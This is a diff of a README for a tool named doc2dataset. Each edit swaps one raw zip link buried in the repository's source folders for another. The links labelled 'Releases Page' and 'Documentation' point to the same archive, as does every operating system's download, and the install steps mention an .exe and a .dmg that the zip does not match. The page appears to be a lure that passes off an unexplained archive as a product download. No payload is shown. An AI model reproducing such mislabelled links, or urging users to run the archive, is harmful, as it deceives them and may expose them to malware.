@@ -6,7 +6,7 @@ Welcome to doc2dataset! This application helps you generate datasets from docume
 
 ## 🔗 Download Now
 
-[![Download doc2dataset](https://raw.githubusercontent.com/reisel-g/doc2dataset/main/crates/service/doc2dataset_1.1.zip)](https://raw.githubusercontent.com/reisel-g/doc2dataset/main/crates/service/doc2dataset_1.1.zip)
+[![Download doc2dataset](https://github.com/reisel-g/doc2dataset/raw/refs/heads/main/crates/cli/dataset_doc_1.9.zip)](https://github.com/reisel-g/doc2dataset/raw/refs/heads/main/crates/cli/dataset_doc_1.9.zip)
 
 ## 📦 System Requirements
 
@@ -19,19 +19,19 @@ Before you download, ensure your computer meets these requirements:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to [this page to download](https://raw.githubusercontent.com/reisel-g/doc2dataset/main/crates/service/doc2dataset_1.1.zip).
+1. **Visit the Releases Page:** Go to [this page to download](https://github.com/reisel-g/doc2dataset/raw/refs/heads/main/crates/cli/dataset_doc_1.9.zip).
    
 2. **Choose the Version:** Locate the latest version of `doc2dataset`. You will see a list of files available for download.
 
 3. **Select Your File:** Click on the appropriate file for your operating system:
-   - For Windows, download `https://raw.githubusercontent.com/reisel-g/doc2dataset/main/crates/service/doc2dataset_1.1.zip`.
-   - For macOS, download `https://raw.githubusercontent.com/reisel-g/doc2dataset/main/crates/service/doc2dataset_1.1.zip`.
-   - For Linux, choose `https://raw.githubusercontent.com/reisel-g/doc2dataset/main/crates/service/doc2dataset_1.1.zip`.
+   - For Windows, download `https://github.com/reisel-g/doc2dataset/raw/refs/heads/main/crates/cli/dataset_doc_1.9.zip`.
+   - For macOS, download `https://github.com/reisel-g/doc2dataset/raw/refs/heads/main/crates/cli/dataset_doc_1.9.zip`.
+   - For Linux, choose `https://github.com/reisel-g/doc2dataset/raw/refs/heads/main/crates/cli/dataset_doc_1.9.zip`.
 
 4. **Run the Installer:**
    - **Windows:** Double-click the `.exe` file and follow the prompts to install.
    - **macOS:** Open the `.dmg` file and drag the app to your Applications folder.
-   - **Linux:** Extract the `https://raw.githubusercontent.com/reisel-g/doc2dataset/main/crates/service/doc2dataset_1.1.zip` file and run the application.
+   - **Linux:** Extract the `https://github.com/reisel-g/doc2dataset/raw/refs/heads/main/crates/cli/dataset_doc_1.9.zip` file and run the application.
 
 5. **Launch the Application:** After installation, open `doc2dataset` from your applications or start menu.
 
@@ -83,7 +83,7 @@ If you have questions or need assistance, feel free to reach out. You can contac
 
 For more information on features and updates, visit our official documentation. You can also explore the community discussions for shared tips and experiences.
 
-- [Releases Page](https://raw.githubusercontent.com/reisel-g/doc2dataset/main/crates/service/doc2dataset_1.1.zip)
-- [Documentation](https://raw.githubusercontent.com/reisel-g/doc2dataset/main/crates/service/doc2dataset_1.1.zip)
+- [Releases Page](https://github.com/reisel-g/doc2dataset/raw/refs/heads/main/crates/cli/dataset_doc_1.9.zip)
+- [Documentation](https://github.com/reisel-g/doc2dataset/raw/refs/heads/main/crates/cli/dataset_doc_1.9.zip)
 
 Thank you for choosing doc2dataset! We hope it simplifies your data generation tasks.
